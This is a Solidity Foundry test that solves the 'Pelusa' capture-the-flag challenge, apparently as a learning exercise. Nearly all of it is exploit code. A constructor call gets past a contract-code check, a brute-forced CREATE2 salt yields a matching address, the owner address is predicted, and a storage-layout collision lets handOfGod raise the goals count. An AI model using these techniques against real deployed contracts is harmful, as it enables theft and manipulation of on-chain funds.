// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/Pelusa.sol";

// Inherit from `Pelusa` to maintain same storage layout,
// so it's easier to modify `goals` variable
contract Player is Pelusa, IGame {
	address ballPossesion;

	// Use constructor to bypass the `msg.sender.code.length == 0`
	constructor(address pelusa, address _ballPossesion) {
		// set the `Pelusa.player`
		Pelusa(pelusa).passTheBall(); 

		ballPossesion = _ballPossesion;
	}

	function getBallPossesion() external view returns (address) {
		return ballPossesion;
	}

	function handOfGod() external returns(uint){
		goals ++;

		return 22_06_1986;
	}
}

contract SolvePelusa is Test {

    Pelusa pelusa;
	address pelusaOwner;

	function setUp() public {
		pelusa = new Pelusa();
	}

	function testPassTheBall() public {
		// 0. calculate the `Pelusa.owner` using its own algorithm
		bytes32 BLOCK_HASH_READ_FROM_NODE_SERVER; // foundry uses 0 as blockhash
        pelusaOwner = address(uint160(uint256(keccak256(
			abi.encodePacked(address(this), BLOCK_HASH_READ_FROM_NODE_SERVER)))));

		// 1. Brute force `salt` to find an address that matches the `%100==10`
		uint salt = bruteForceSalt(1000); // just try 1000 times
		require (uint(salt) != 0, "no valid salt");

		// 2. Set the `Pelusa.player`
		new Player{salt: bytes32(salt)}(
			address(pelusa), pelusaOwner 
		);

		// 3. shoot
		pelusa.shoot();

		require(pelusa.goals() == 2, "goals != 2");
	}

	function bruteForceSalt(uint max) private view returns(uint) {
		uint hashInitCode = uint(keccak256(abi.encodePacked(
			type(Player).creationCode, abi.encode(address(pelusa), pelusaOwner)
		)));

		for (uint salt=1; salt<=max; salt++) {
			uint160 numAddr = uint160(uint(keccak256(abi.encodePacked(
				bytes1(0xff), address(this), salt, hashInitCode))));

			if (numAddr % 100 == 10) {
				return salt;
			}
		}
		return 0;
	}
}
